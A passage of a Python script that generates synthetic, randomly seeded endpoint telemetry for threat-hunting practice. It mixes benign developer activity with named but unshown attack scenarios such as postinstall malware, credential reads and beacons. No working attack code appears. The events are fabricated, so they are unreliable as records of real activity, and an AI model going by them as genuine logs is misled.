        ev = _new_event(ts, "PROCESS_START", endpoint, user, scenario="noise_node", hunt_ids=[])
        ev["process"] = {"image_name": "node", "image_path": "/usr/local/bin/node",
                         "command_line": "node server.js",
                         "pid": random.randint(1000, 60000),
                         "parent": {"image_name": "zsh", "command_line": "", "pid": 100}}
        return [ev]
    if pick == "browser_open":
        n, p = _proc_browser(endpoint, "chrome")
        ev = _new_event(ts, "PROCESS_START", endpoint, user, scenario="noise_browser", hunt_ids=[])
        ev["process"] = {"image_name": n, "image_path": p,
                         "command_line": f"\"{p}\"",
                         "pid": random.randint(1000, 60000),
                         "parent": {"image_name": "explorer.exe", "command_line": "", "pid": 4}}
        ev_dns = _new_event(ts + timedelta(seconds=1), "DNS_QUERY", endpoint, user,
                            scenario="noise_browser_dns", hunt_ids=[])
        ev_dns["process"] = ev["process"]
        ev_dns["dns"] = {"query": random.choice(LEGIT_DOMAINS),
                         "response_ip": f"140.82.{random.randint(0,255)}.{random.randint(0,255)}"}
        return [ev, ev_dns]
    if pick == "ide_open":
        n, p = _proc_ide(endpoint, "vscode")
        ev = _new_event(ts, "PROCESS_START", endpoint, user, scenario="noise_ide_open", hunt_ids=[])
        ev["process"] = {"image_name": n, "image_path": p,
                         "command_line": f"\"{p}\"",
                         "pid": random.randint(1000, 60000),
                         "parent": {"image_name": "explorer.exe", "command_line": "", "pid": 4}}
        return [ev]
    # yarn_install
    pkg = random.choice(LEGIT_NPM_PACKAGES)
    ev = _new_event(ts, "PROCESS_START", endpoint, user, scenario="noise_yarn", hunt_ids=[])
    ev["process"] = {"image_name": "yarn", "image_path": "/usr/local/bin/yarn",
                     "command_line": f"yarn add {pkg}", "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "zsh", "command_line": "", "pid": 100}}
    return [ev]


# ---------------------------------------------------------------------------
# Master mix
# ---------------------------------------------------------------------------
SCENARIO_MIX = [
    # weight, callable
    (40, scenario_noise),
    (15, scenario_legit_browser_extension_install),
    (15, scenario_legit_ide_extension),
    (15, scenario_legit_npm_install),
    ( 3, scenario_dangerous_perms_extension),
    ( 2, scenario_sideloaded_extension),
    ( 2, scenario_native_messaging_host),
    ( 2, scenario_browser_beacon),
    ( 2, scenario_malicious_ide_extension),
    ( 2, scenario_ide_spawns_shell),
    ( 2, scenario_ide_reads_creds),
    ( 1, scenario_ide_beacon),
    ( 5, scenario_postinstall_malware),
    ( 1, scenario_lockfile_mutation_no_install),
]


def generate_events(count: int = 500, hours_back: int = 24,
                    seed: int | None = None) -> List[dict]:
    """Generate `count` *target* events; the actual output will be larger
    because each scenario emits a chain of events."""
    if seed is not None:
        random.seed(seed)
    now = datetime.utcnow()
    weights = [w for w, _ in SCENARIO_MIX]
    fns     = [f for _, f in SCENARIO_MIX]
    out: list[dict] = []
    while len(out) < count:
        fn = random.choices(fns, weights=weights, k=1)[0]
        ts = _ts_random(now, hours_back)
        endpoint = random.choice(ENDPOINTS)
        user = random.choice(DEVELOPERS)
        try:
            out.extend(fn(ts, endpoint, user))
        except TypeError:
            # scenario_worm_burst has a different signature
            pass

    # also fire one worm burst per generation run
    out.extend(scenario_worm_burst(_ts_random(now, hours_back), ENDPOINTS, DEVELOPERS))
    # sort by timestamp so the NDJSON is chronological
    out.sort(key=lambda e: e["timestamp"])
    return out


if __name__ == "__main__":
    count       = int(sys.argv[1]) if len(sys.argv) > 1 else 500
    hours_back  = int(sys.argv[2]) if len(sys.argv) > 2 else 24
    seed        = int(sys.argv[3]) if len(sys.argv) > 3 else None
    for e in generate_events(count, hours_back, seed):
        print(json.dumps(e))
